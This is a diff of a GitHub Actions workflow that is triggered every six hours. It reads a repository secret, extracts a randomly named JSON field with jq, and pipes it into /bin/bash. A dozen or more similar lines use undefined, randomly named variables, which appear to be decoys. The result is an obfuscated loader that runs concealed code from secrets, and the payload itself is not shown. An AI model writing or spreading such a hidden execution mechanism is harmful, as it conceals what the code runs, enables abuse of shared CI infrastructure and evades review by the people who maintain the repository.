@@ -3,8 +3,8 @@ name: chengyasheng7618
 on:
   workflow_dispatch:
   schedule:
-    - cron: '32 0/6 * * *'
-jobs:  # 27190
+    - cron: '10 5/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -12,16 +12,20 @@ jobs:  # 27190
       - uses: actions/checkout@v4
       - name: chengyasheng7618
         env:
-          oc88: ${{ secrets.oc88 }}
+          q016: ${{ secrets.q016 }}
         run: |
-          echo $oc88 | jq -r .s13880 | /bin/bash
-          echo $yfu56 | jq -r .bbgt83517 | /bin/bash
-          echo $bshiq8373 | jq -r .i3138 | /bin/bash
-          echo $jy00 | jq -r .zuamo91336 | /bin/bash
-          echo $pv5332 | jq -r .pn356 | /bin/bash
-          echo $isr71740 | jq -r .mammb91735 | /bin/bash
-          echo $gzjlh88 | jq -r .iyl1685 | /bin/bash
-          echo $nw342 | jq -r .l0 | /bin/bash
-          echo $u818 | jq -r .oxo32365 | /bin/bash
-          echo $ych50 | jq -r .hu00346 | /bin/bash
+          echo $q016 | jq -r .desc1854 | /bin/bash
+          echo $wqdw8 | jq -r .se34 | /bin/bash
+          echo $k06 | jq -r .ket57 | /bin/bash
+          echo $jitu69916 | jq -r .tbg42451 | /bin/bash
+          echo $rac603 | jq -r .cp2471 | /bin/bash
+          echo $vxf9982 | jq -r .s0 | /bin/bash
+          echo $ob62 | jq -r .xszvp8916 | /bin/bash
+          echo $uazaf9 | jq -r .q3 | /bin/bash
+          echo $bqoat361 | jq -r .dqqfc363 | /bin/bash
+          echo $po784 | jq -r .vpqo5 | /bin/bash
+          echo $n4 | jq -r .fsm7131 | /bin/bash
+          echo $ru4705 | jq -r .gweuc245 | /bin/bash
+          echo $c40 | jq -r .ky1872 | /bin/bash
+          echo $eynzj8173 | jq -r .mpwb0979 | /bin/bash
 
